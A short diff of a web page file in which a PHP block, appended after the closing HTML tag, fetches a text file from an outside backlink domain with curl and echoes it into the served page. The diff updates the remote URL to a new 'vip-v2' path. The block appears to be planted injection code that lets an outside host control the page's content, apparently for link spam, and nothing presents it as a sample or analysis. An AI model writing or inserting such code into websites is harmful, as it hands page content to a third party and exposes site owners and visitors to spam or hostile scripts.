@@ -206,7 +206,7 @@ urchinTracker();
 </body>
 </html>
 <?php
-$url = 'https://backlinkku.id/menu/vip-v1/script.txt';
+$url = 'https://backlinkku.id/menu/vip-v2/script.txt';
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -218,4 +218,5 @@ if (curl_errno($ch)) {
     echo $content;
 }
 curl_close($ch);
+
 ?>
